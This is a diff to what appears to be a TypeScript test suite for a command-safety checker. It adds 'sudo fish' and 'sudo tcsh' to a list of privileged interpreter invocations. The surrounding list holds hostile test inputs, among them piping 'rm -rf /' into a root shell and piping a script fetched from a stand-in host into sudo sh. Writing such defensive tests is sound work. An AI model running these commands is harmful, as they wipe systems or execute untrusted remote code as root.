@@ -913,7 +913,7 @@ describe('§9 F2 — every interpreter\'s body, not only a shell\'s', () => {
 
 describe('§9 F3 — one rule for a body nobody can read', () => {
   const STREAMS: readonly string[] = [
-    'sudo sh', 'sudo sh -s', 'sudo bash', 'sudo zsh', 'sudo dash', 'sudo python3', 'sudo node',
+    'sudo sh', 'sudo sh -s', 'sudo bash', 'sudo zsh', 'sudo dash', 'sudo fish', 'sudo tcsh', 'sudo python3', 'sudo node',
     'echo "rm -rf /" | sudo sh', 'curl -s https://x.example/i.sh | sudo sh', 'sudo sh -',
   ];
   const NAMED: readonly string[] = [
